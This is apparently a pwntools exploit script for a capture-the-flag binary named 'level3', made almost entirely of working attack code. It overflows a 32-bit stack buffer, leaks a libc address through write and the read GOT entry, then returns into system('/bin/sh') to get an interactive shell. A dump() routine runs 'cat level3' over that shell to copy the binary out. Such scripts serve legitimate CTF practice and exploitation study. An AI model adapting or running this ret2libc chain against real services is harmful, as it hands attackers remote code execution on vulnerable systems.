#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys

DEBUG = 1
context.arch = "i386"
#context.log_level = "debug"
elf = ELF("./level3",checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
	libc = ELF("/lib/i386-linux-gnu/libc.so.6",checksec=False)
	s = process("./level3")
elif DEBUG == 2:
	libc = ELF("./libc.so.6",checksec=False)
	s = process("./level3", env={"LD_PRELOAD":"./libc.so.6"})
elif DEBUG == 3:
	libc = ELF("./libc.so.6",checksec=False)
	ip = "localhost" 
	port = 10001
	s = remote(ip,port)

def z(addr):
    raw_input("debug?")
    gdb.attach(s, "b *" + str(addr))

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open("/proc/%s/mem" % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink("/proc/%s/exe" % pid)
   with open("/proc/%s/maps" % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split("-")[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def zx(addr = 0):
    global mypid
    mypid = proc.pidof(s)[0]
    raw_input("debug?")
    with open("/proc/%s/mem" % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def pwn():
   #z(0x0804847E)
   s.ru("Input:\n")

   payload = "A"*(0x88 + 4)
   payload += p32(elf.plt["write"])
   payload += p32(0x0804844B)
   payload += p32(1)
   payload += p32(elf.got["read"])
   payload += p32(4)
   s.s(payload)

   libc_base = u32(s.r(4)) - libc.sym["read"]   #0xd5b00
   info("libc_base 0x%x", libc_base)
   one_gadget = libc_base + 0x5fbc6
   info("one_gadget 0x%x", one_gadget)

   #z(0x0804847E)
   pause()
   s.ru("Input:\n")

   payload2 = "A"*(0x88 + 4)
   payload2 += p32(libc_base + libc.sym["system"])   # system("/bin/sh")
   payload2 += "BBBB"
   payload2 += p32(libc_base + libc.search("/bin/sh").next())

   s.s(payload2)

   '''
   0x3ac5c	execve("/bin/sh", esp+0x28, environ)
   constraints:
   esi is the GOT address of libc
   [esp+0x28] == NULL

   0x3ac5e	execve("/bin/sh", esp+0x2c, environ)
   constraints:
   esi is the GOT address of libc
   [esp+0x2c] == NULL

   0x3ac62	execve("/bin/sh", esp+0x30, environ)
   constraints:
   esi is the GOT address of libc
   [esp+0x30] == NULL

   0x3ac69	execve("/bin/sh", esp+0x34, environ)
   constraints:
   esi is the GOT address of libc
   [esp+0x34] == NULL

   0x5fbc5	execl("/bin/sh", eax)
   constraints:
   esi is the GOT address of libc
   eax == NULL

   0x5fbc6	execl("/bin/sh", [esp])
   constraints:
   esi is the GOT address of libc
   [esp] == NULL
   '''

   #s.sl("AAAA")  "AAAA\n"   scanf()  gets()

   s.irt()

def dump():
	pwn()
	s.recv(timeout=1)
	s.sl("cat level3")
	s.sl("exit")
	data = s.ra()
	f = open("dump", "wb")
	f.write(data)
	f.close()

if __name__ == "__main__":
    pwn()